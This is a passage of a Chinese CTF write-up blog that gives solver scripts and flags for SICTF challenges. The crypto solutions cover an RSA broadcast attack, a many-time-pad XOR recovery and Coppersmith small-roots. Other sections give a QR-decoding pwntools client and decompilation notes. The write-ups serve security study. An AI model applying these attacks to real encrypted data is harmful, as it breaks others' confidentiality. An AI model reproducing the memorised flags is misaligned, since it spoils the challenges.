class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line"># from flag import flag</span><br><span class="line">import gmpy2</span><br><span class="line">from functools import reduce</span><br><span class="line"># m = bytes_to_long(flag)</span><br><span class="line"># p = getPrime(1024)</span><br><span class="line"># q = getPrime(1024)</span><br><span class="line"># n1 = p * q</span><br><span class="line"># p = getPrime(1024)</span><br><span class="line"># q = getPrime(1024)</span><br><span class="line"># n2 = p * q</span><br><span class="line"># p = getPrime(1024)</span><br><span class="line"># q = getPrime(1024)</span><br><span class="line"># n3 = p * q</span><br><span class="line">e = 17</span><br><span class="line"># c1 = pow(m,e,n1)</span><br><span class="line"># c2 = pow(m,e,n2)</span><br><span class="line"># c3 = pow(m,e,n3)</span><br><span class="line"># print(&quot;n1 =&quot;,n1)</span><br><span class="line"># print(&quot;n2 =&quot;,n2)</span><br><span class="line"># print(&quot;n3 =&quot;,n3)</span><br><span class="line"># print(&quot;c1 =&quot;,c1)</span><br><span class="line"># print(&quot;c2 =&quot;,c2)</span><br><span class="line"># print(&quot;c3 =&quot;,c3)</span><br><span class="line"># def CRT(items):</span><br><span class="line">#     N = reduce(lambda x, y: x * y, (i[1] for i in items))</span><br><span class="line">#     result = 0</span><br><span class="line">#     for a, n in items:</span><br><span class="line">#         m = N / n</span><br><span class="line">#         d, r, s = gmpy2.gcdext(n, m)</span><br><span class="line">#         if d != 1: raise Exception(&quot;Input not pairwise co-prime&quot;)</span><br><span class="line">#         result += a * s * m</span><br><span class="line">#     return result % N, N</span><br><span class="line"># 读入 e, n, c</span><br><span class="line">n1 = 14628911682936716611458501697007036859460044243525290515096052103585430459755335375005202100114469571371360084664887335211277585652711111523095037589648375630146039444071400098427638768750755153219974194380355807078158427824557754939604018020265955042573660474772006646525311705184431094905718137297923127124517126579859336516891364853724635334011666814712424599592662398013241607855160919361308195967978220182785816761656927836373944699635667244275310680450562446433724968942835275279255823144471582249379035668825437133182865600026935116686574740844588839352146024513673500770611055698030333734066230166111140083923  </span><br><span class="line">n2 = 16756694748293603983474688536179571665757862433174984877308316444468003022266277794769268134195205510197588585566270416339902269736376811449830775290335951504698137924773942880807921752691668522662285163130340474205633998154849689387759453003838730282756734975490180702422176361373516245372635401939755527017589503572550811648345570775428936487145892225736625411540461653083957762795820510109891180906709827194217045059033312564525916136573856999724346161896146703174418039344166251503310869772735585554127509732135494936119159784702673291794381095696332128950979288440758815310482211285712819274848744478643590996499  </span><br><span class="line">n3 = 12023158079717019193506148537498877243668782424904061914991928068483879707115315968983829360560644394409575645736275352836086080024994045582242629571839276759393418303915955798990522990081795218822313146157773272844272865701134880180795342597049645358985187689813369428579614193015028249821853347208001645148169449968882591709833452960545988520048722323580338213590245476892223967673180144525106292453573842357322398199104132677638909964034937501684668442732786408572501007756270725934445316827054687741612177409932320532825182104820899546084015733164816993674100635828218335112393003462442685677115798304835391938681  </span><br><span class="line">c1 = 786426913645332991929803636719878643130489430090701482974255190570111407517277263761161970232982615374753982050075781017755721714929721429185828101898786972242994012456972241276851428750970754773002966788642795040933520662931514953660571657013642671173456750800960592586345219252277575624120271330470724245201080094330964145796872211627254805407394764183615099525852600855622089361965086460279057625205099471122036599934609091062009161119885692567925924978687256063116915630947838112126347748759078024890458539541208153526564434483654508834147071166870006117573542198238493913144419569943131642262575848786399020602    </span><br><span class="line">c2 = 14269311999815379511888097227418748728398011595172649708273598243317106830139061994801598925448165045032084910971094414749744701731066555194159863759072739031915833091715422787808666326235589236328864675164322734119047182014621724868200908222400504845559290620275973427127376594365043386362821355037781568524903149101953873768462097165128186788759111090267131443645126715520994688945363059795513931799317608292977574376954729552861360597103229877031117089231816770880909815561950691603994439997197261395452797893557057320175747162837857668062550646101714062365530246698404923128445182100334335447738834779014705114350  </span><br><span class="line">c3 = 3204718091370324153305164801961074660508922478706979436653573192321723216725523523538914956544950802616295043619768261075799875855502834749045520466140056621489305006966280527055668378303630674311102581232313032585389907028715671091914904062961720585667564982641321454541632782484415075257140508738041786400512095949826279576159569786734978545737717138115729502475357594151593143140355121154223614868465202149338507796306863351134218879326031985027900678671697876083351974546516576983143592764763925335805465720148057651958521255276602933604064541840892578409973858867533575728482926007556060584654853884046046420855 </span><br><span class="line"></span><br><span class="line"># def gongmogongji(c1, c2, e1, e2,n):</span><br><span class="line">#   from Crypto.Util.number import long_to_bytes</span><br><span class="line">#   from gmpy2 import gcdext,iroot</span><br><span class="line">#   gcd,x,y=gcdext(e1,e2)#求出e1*x+e2*y=gcd(e1,e2)的解</span><br><span class="line">#   m=iroot((pow(c1,x,n)*pow(c2,y,n))%n,gcd)[0]#根据((c1^x) * (c2^y))^(1/gcd(e1,e2))%n=m %n  计算出对应的m</span><br><span class="line">#   return long_to_bytes(m)#将m转换回bytes数组</span><br><span class="line"># gongmogongji(c1,c2,e,e,n)</span><br><span class="line">n=[n1,n2,n3]</span><br><span class="line">c=[c1,c2,c3]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def gcd(a,b):</span><br><span class="line">    while a != 0:</span><br><span class="line">        a, b = b % a, a</span><br><span class="line">    return (b)</span><br><span class="line"></span><br><span class="line">def sumed(a):</span><br><span class="line">    num = 1</span><br><span class="line">    for i in range(len(a)):</span><br><span class="line">        num *= a[i]</span><br><span class="line">    return (num)</span><br><span class="line"></span><br><span class="line">def ive(Mi,mi):</span><br><span class="line">    return (inverse(Mi,mi))</span><br><span class="line"></span><br><span class="line">def chinese_remain(n,c,e):</span><br><span class="line">    k = len(n)</span><br><span class="line">    med = n</span><br><span class="line">    isok = 1</span><br><span class="line">    for i in range(k-1):</span><br><span class="line">        for j in range(i+1,k):</span><br><span class="line">            if gcd(med[i],med[j])!=1:</span><br><span class="line">                isok = 0</span><br><span class="line">                break</span><br><span class="line">        if isok == 0:</span><br><span class="line">            break</span><br><span class="line">    if isok == 0:</span><br><span class="line">        print(&quot;m中存在两两不互素，不能直接利用中国剩余定理&quot;)</span><br><span class="line">    else:</span><br><span class="line">        a = c</span><br><span class="line">        M = []</span><br><span class="line">        invM = []</span><br><span class="line">        xk = []</span><br><span class="line">        num = sumed(med)</span><br><span class="line">        for i in range(k):</span><br><span class="line">            M.append( num//med[i] )</span><br><span class="line">        for i in range(k):</span><br><span class="line">            invM.append( int(ive(M[i],med[i])) )</span><br><span class="line">        for i in range(k):</span><br><span class="line">            xk.append( M[i]*invM[i]*a[i]%num )</span><br><span class="line">        xxx=sum(xk)%num</span><br><span class="line">        result=int(gmpy2.iroot(xxx,e)[0])</span><br><span class="line">        result=hex(result)[2:]</span><br><span class="line">        print(result)</span><br><span class="line">        return result</span><br><span class="line">print(long_to_bytes(int(chinese_remain(n,c,e),16)))</span><br></pre></td></tr></table></figure>

<p>SICTF{fdc0afb5-1c81-46b9-a28a-241f5f64419d}</p>
<h2 id="MingTianPao"><a href="#MingTianPao" class="headerlink" title="MingTianPao"></a>MingTianPao</h2><p>开始做的时候知道开头是SICTF{可以确定部分信息</p>
<p>后续再进行一步步的手动爆破确定前面几位是MTP</p>
<p>找到这坨关键信息</p>
<p>b’Little Redxxxxxxxxxxxxxxxxxxxed to obey xxxxxxxxxxxxxxxxxxxndmother lixxxxxxxxxxxxxxxxxxxs, a half hxxxxxxxxxxxxxxxxxxxe. When Litxxxxxxxxxxxxxxxxxxx entered thxxxxxxxxxxxxxxxxxxx up to her.xxxxxxxxxxxxxxxxxxxhat a wickexxxxxxxxxxxxxxxxxxxd was not axxxxxxxxxxxxxxxxxxx day to youxxxxxxxxxxxxxxxxxxx ‘</p>
<p><a target="_blank" rel="noopener" href="https://m.kekenet.com/read/200803/30037.shtml">格林童话:Little Red Cap 小红帽_格林童话_双语阅读 - 可可英语 (kekenet.com)</a></p>
<p>exp:</p>
<p>找到故事是小红帽</p>
<p>找到其中出现次数比较唯一的这个at a wicked animal he was, and</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">from Crypto.Util.number import*</span><br><span class="line">from Crypto.Util.strxor import *</span><br><span class="line"># from secret import flag, message</span><br><span class="line"># message is a Classic English Story</span><br><span class="line"></span><br><span class="line"># for i in range(10):</span><br><span class="line">#     tmp = (message[i*30:(i+1)*30].encode())</span><br><span class="line">#     print(binascii.hexlify(strxor(tmp,flag)).decode())</span><br><span class="line">#Little Red Cap was taking some baked things to her grandmother another time, when another wolf spoke to her and wanted her to leave the path. But Little Red Cap took care and went straight to grandmother&#x27;s. She told her that she had seen the wolf, and that he had wished her a good day, but had stared at her in a wicked manner</span><br><span class="line"></span><br><span class="line">a=[0x1f2037202a1e6d06353b61263d050a0538493b3018544e14171d2b1c4218,</span><br><span class="line">   0x3769373b66142f31297f291126410e042b01162d59103a0c005221075013,</span><br><span class="line">   0x37242c202e1e3f743c36371130410c1e2b491a31574406014505291a550e,</span><br><span class="line">   0x7f6922742e1a213270372e01264105193004532b1f554e120c1e2a145618,</span><br><span class="line">   0x7d69143c23156d18392b35183141310e3b49213613590003453a291a555d,</span><br><span class="line">   0x36273731341e297424372454230e0c0f2c49127f005f020245112718545d,</span><br><span class="line">   0x26396320295b2531227161273c04430f360d533118444e0f0b1d31554615,</span><br><span class="line">   0x323d6335660c24373b3a2554350f0a063e05533712101905165e66145f19,</span><br><span class="line">   0x733e222766152220703e27063508074b300f53371e5d40444735291a555d,</span><br><span class="line">   0x37283a7432146d2d3f2a6d541808171f330c530d12544e360c162f1b565d]</span><br><span class="line">#65</span><br><span class="line">flag=bytes_to_long(b&quot;at a wicked animal he was, and&quot;)</span><br><span class="line">str1=b&#x27;&#x27;</span><br><span class="line"># lena=10</span><br><span class="line"># for i in a:</span><br><span class="line">    # str1=long_to_bytes(flag^i)[:lena]+((len(&quot;SICTF&#123; aaaaaaaaaaaaaaaaaaaaaa&#125;&quot;)-(lena+1))*b&#x27;x&#x27;)+long_to_bytes(flag^i)[-1:]</span><br><span class="line">    # print(str1)</span><br><span class="line">print(long_to_bytes(a[-3]^flag))</span><br></pre></td></tr></table></figure>

<p>SICTF{MTP_AtTack_is_w0nderFu1}</p>
<h2 id="small-e"><a href="#small-e" class="headerlink" title="small_e"></a>small_e</h2><p>网上有类似题型</p>
<p>exp:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"># import libnum</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">import uuid</span><br><span class="line">from sage.all import *</span><br><span class="line"># flag=&quot;SICTF&#123;&quot;+str(uuid.uuid4())+&quot;&#125;&quot;</span><br><span class="line"># m=libnum.s2n(flag)</span><br><span class="line"># p=getPrime(1024)</span><br><span class="line"># q=getPrime(1024)</span><br><span class="line"># n=p*q</span><br><span class="line"># e=3</span><br><span class="line"># c=pow(m,e,n)</span><br><span class="line"># m1=((m&gt;&gt;60)&lt;&lt;60)</span><br><span class="line"># print(&quot;n=&quot;,n)</span><br><span class="line"># print(&quot;e=&quot;,e)</span><br><span class="line"># print(&quot;c=&quot;,c)</span><br><span class="line"># print(&quot;((m&gt;&gt;60)&lt;&lt;60)=&quot;,m1)</span><br><span class="line"># print(flag)</span><br><span class="line"># &#x27;&#x27;&#x27;</span><br><span class="line">n= 23407088262641313744603678186127228163189328033499381357614318160776774708961658114505773173784501557046914457908828086210961235530240151825359345210845219656000760996670856300710703016947799649686427460688236465568188205550456293373157997725204643414082796492333552579250010906010553831060540937802882205118399938918764313169385349293602085310111289583058965780887097301702677087443291977479125263301000328313103296364864396361278863921717374909215078711198899810620522933994481419395021233240234478331179727351050575360886334237633420906629984625441302945112631166021776379103081857393866576659121443879590011160797</span><br><span class="line">e= 3</span><br><span class="line">c= 1584727211980974717747362694412040878682966138197627512650829607105625096823456063149392973232737929737200028676411430124019573130595696272668927725536797627059576270068695792221537212669276826952363636924278717182163166234322320044764324434683614360641636360301452618063418349310497430566465329766916213742181</span><br><span class="line"># ((m&gt;&gt;60)&lt;&lt;60)</span><br><span class="line">m= 11658736990073967239197168945911788935424691658202162501032766529463315401599017877851823976178979438592</span><br><span class="line"># &#x27;&#x27;&#x27;</span><br><span class="line"># n = 0x2519834a6cc3bf25d078caefc5358e41c726a7a56270e425e21515d1b195b248b82f4189a0b621694586bb254e27010ee4376a849bb373e5e3f2eb622e3e7804d18ddb897463f3516b431e7fc65ec41c42edf736d5940c3139d1e374aed1fc3b70737125e1f540b541a9c671f4bf0ded798d727211116eb8b86cdd6a29aefcc7</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># e = 3</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># m = randrange(n)</span><br><span class="line"> </span><br><span class="line"># c = pow(m, e, n)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># n = 0x2519834a6cc3bf25d078caefc5358e41c726a7a56270e425e21515d1b195b248b82f4189a0b621694586bb254e27010ee4376a849bb373e5e3f2eb622e3e7804d18ddb897463f3516b431e7fc65ec41c42edf736d5940c3139d1e374aed1fc3b70737125e1f540b541a9c671f4bf0ded798d727211116eb8b86cdd6a29aefcc7</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># e = 3</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">m = randrange(n)</span><br><span class="line"> </span><br><span class="line">c = pow(m, e, n)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">beta = 1</span><br><span class="line"> </span><br><span class="line">epsilon = beta**2/7</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">nbits = n.bit_length()</span><br><span class="line"> </span><br><span class="line">kbits = floor(nbits*(beta**2/e-epsilon))</span><br><span class="line"> </span><br><span class="line"># mbar = m &amp; (2^nbits-2^kbits)</span><br><span class="line"> </span><br><span class="line">mbar = 11658736990073967239197168945911788935424691658202162501032766529463315401599017877851823976178979438592</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">c = 1584727211980974717747362694412040878682966138197627512650829607105625096823456063149392973232737929737200028676411430124019573130595696272668927725536797627059576270068695792221537212669276826952363636924278717182163166234322320044764324434683614360641636360301452618063418349310497430566465329766916213742181</span><br><span class="line"> </span><br><span class="line">print( f&quot;upper &#123;nbits-kbits&#125; bits (of &#123;nbits&#125; bits) is given&quot;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">PR = PolynomialRing(Zmod(n),&#x27;x&#x27;)</span><br><span class="line"> </span><br><span class="line">f = (mbar + PR(&#x27;x&#x27;))**e - c</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">print( m)</span><br><span class="line"> </span><br><span class="line">x0 = f.small_roots(X=2**kbits, beta=1)[0]  # find root &lt; 2^kbits with factor = n1</span><br><span class="line"> </span><br><span class="line">print( mbar + x0)</span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<p>SICTF{2ca8e589-4a31-4909-80f0-9ecfc8f8cb37}</p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="fast-morse"><a href="#fast-morse" class="headerlink" title="fast_morse"></a>fast_morse</h2><p><a target="_blank" rel="noopener" href="https://morsecode.world/international/decoder/audio-decoder-expert.html">Morse Code Audio Decoder | Morse Code World</a></p>
<p>最后才知道要小写</p>
<p>SICTF{f2a09bf-7f4abt42-93a5-c8a48360b03c}</p>
<h2 id="QR-QR-QR"><a href="#QR-QR-QR" class="headerlink" title="QR_QR_QR"></a>QR_QR_QR</h2><p>用pwntool读取二进制数 用PIL包绘图(1为白0为黑)喊AI写个QR扫描器</p>
<p>随手输了个1000次刚好就是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">import cv2</span><br><span class="line">from pyzbar import pyzbar</span><br><span class="line">import numpy as np</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def scan_qrcode(image_path)-&gt; str:</span><br><span class="line">    # 读取图像</span><br><span class="line">    # image = cv2.imread(image_path)</span><br><span class="line">    image=np.array(image_path)</span><br><span class="line">    # 转换为灰度图像</span><br><span class="line">    gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)</span><br><span class="line"></span><br><span class="line">    # 使用pyzbar库识别二维码</span><br><span class="line">    barcodes = pyzbar.decode(gray)</span><br><span class="line"></span><br><span class="line">    # 遍历识别到的二维码</span><br><span class="line">    for barcode in barcodes:</span><br><span class="line">        # 提取二维码的边界框坐标</span><br><span class="line">        (x, y, w, h) = barcode.rect</span><br><span class="line"></span><br><span class="line">        # 绘制边界框及二维码数据</span><br><span class="line">        cv2.rectangle(image, (x, y), (x + w, y + h), (0, 255, 0), 2)</span><br><span class="line">        barcode_data = barcode.data.decode(&quot;utf-8&quot;)</span><br><span class="line">        barcode_type = barcode.type</span><br><span class="line">        text = &quot;&#123;&#125; (&#123;&#125;)&quot;.format(barcode_data, barcode_type)</span><br><span class="line">        cv2.putText(image, text, (x, y - 10), cv2.FONT_HERSHEY_SIMPLEX, 0.5, (0, 255, 0), 2)</span><br><span class="line"></span><br><span class="line">        # 输出二维码信息</span><br><span class="line">        return barcode_data</span><br><span class="line"></span><br><span class="line">    # 显示结果图像</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from PIL import Image</span><br><span class="line">p=remote(&quot;210.44.151.51&quot;,10397)</span><br><span class="line">for i in range(1000):</span><br><span class="line">    starttime= time.time()</span><br><span class="line">    tmp=p.recvuntil(&quot;Please Decrypt this QR code:&quot;).decode().replace(&#x27;\n&#x27;,&#x27;&#x27;)</span><br><span class="line">    if &#x27;01&#x27; not in tmp:</span><br><span class="line">        break</span><br><span class="line">    endtime=time.time()</span><br><span class="line">    if(endtime-starttime&gt;1000):</span><br><span class="line">        break</span><br><span class="line">    width = int(math.sqrt(len(tmp)))</span><br><span class="line">    height = int(math.sqrt(len(tmp)))</span><br><span class="line">    img = Image.new(&#x27;RGB&#x27;, (width, height))</span><br><span class="line">    for x in range(height):</span><br><span class="line">        for y in range(width):</span><br><span class="line">            if(tmp[x*width+y]==&#x27;1&#x27;):</span><br><span class="line">                img.putpixel((x,y),(255,255,255))</span><br><span class="line">    p.sendline(scan_qrcode(img))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="pyc"><a href="#pyc" class="headerlink" title="pyc"></a>pyc</h2><p>pycdc反编译一下就出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(wrwrw㉿DESKTOP-1DM15A6)-[/mnt/e/EDGE下载/PYC (1)]</span><br><span class="line">└─$ pycdc &quot;./file.pyc&quot;</span><br><span class="line"># Source Generated with Decompyle++</span><br><span class="line"># File: file.pyc (Python 3.8)</span><br><span class="line"></span><br><span class="line">print(&#x27;SICTF&#123;07e278e7-9d66-4d90-88fc-8bd61e490616&#125;&#x27;)</span><br></pre></td></tr></table></figure>

<p>SICTF{07e278e7-9d66-4d90-88fc-8bd61e490616}</p>
<h2 id="Myobject"><a href="#Myobject" class="headerlink" title="Myobject"></a>Myobject</h2><p>用lazyida提取密文</p>
<p><img src="https://ilikeoyt.github.io/image/si21.png" alt="image"></p>
<p>密钥是SIFLAG</p>
<p><img src="https://ilikeoyt.github.io/image/si22.png" alt="image"></p>
<h2 id="cnbase"><a href="#cnbase" class="headerlink" title="cnbase"></a>cnbase</h2><p>换表base64</p>
<p><img src="https://ilikeoyt.github.io/image/si23.png" alt="image"></p>
<p><img src="https://ilikeoyt.github.io/image/si24.png" alt="image"></p>
<h2 id="不一样的base64"><a href="#不一样的base64" class="headerlink" title="不一样的base64"></a>不一样的base64</h2><p>一眼python的exe</p>
<p><img src="https://ilikeoyt.github.io/image/si25.png" alt="image"></p>
<p>用pyinstxtractor-ng.py提取得到</p>
<p>名字不太一样的就是原来的pyc文件（此处的111.pyc</p>
<p><img src="https://ilikeoyt.github.io/image/si26.png" alt="image"></p>
<p>普通base64</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">┌──(wrwrw㉿DESKTOP-1DM15A6)-[/mnt/e/BaiduNetdiskDownload/file.exe_extracted]</span><br><span class="line">└─$ pycdc 111.pyc</span><br><span class="line"># Source Generated with Decompyle++</span><br><span class="line"># File: 111.pyc (Python 3.8)</span><br><span class="line"></span><br><span class="line">BASE64_CHARS = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br><span class="line"></span><br><span class="line">def base64_encode(data):</span><br><span class="line">    binary_str = &#x27;&#x27;.join((lambda .0: for x in .0:</span><br><span class="line">format(x, &#x27;08b&#x27;))(data))</span><br><span class="line">    padding = len(binary_str) % 24</span><br><span class="line">    if padding != 0:</span><br><span class="line">        binary_str += &#x27;0&#x27; * (24 - padding)</span><br><span class="line">    result = &#x27;&#x27;</span><br><span class="line">    for i in range(0, len(binary_str), 6):</span><br><span class="line">        group = binary_str[i:i + 6]</span><br><span class="line">        decimal_val = int(group, 2)</span><br><span class="line">        result += BASE64_CHARS[decimal_val]</span><br><span class="line">    padding_count = (4 - len(result) % 4) % 4</span><br><span class="line">    result += &#x27;=&#x27; * padding_count</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line">data = input(&#x27;&#x27;).encode()</span><br><span class="line">encoded_data = base64_encode(data)</span><br><span class="line">print(encoded_data)</span><br><span class="line">if encoded_data == &#x27;U0lDVEZ7OGUwZDM1OGQtOGI5ZC00ODY2LTliMDItNjc0OWIwN2FkMDlhfQAA&#x27;:</span><br><span class="line">    print(&#x27;True!&#x27;)</span><br></pre></td></tr></table></figure>

<p><img src="https://ilikeoyt.github.io/image/si27.png" alt="image"></p>
<h2 id="javacode"><a href="#javacode" class="headerlink" title="javacode"></a>javacode</h2><p>喊ai将字节码翻译回去，gpt3.5总是把加密部分翻译错</p>
<p>加密部分在343行附近 手动搓回去 位运算优先级也把我搞炸了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span 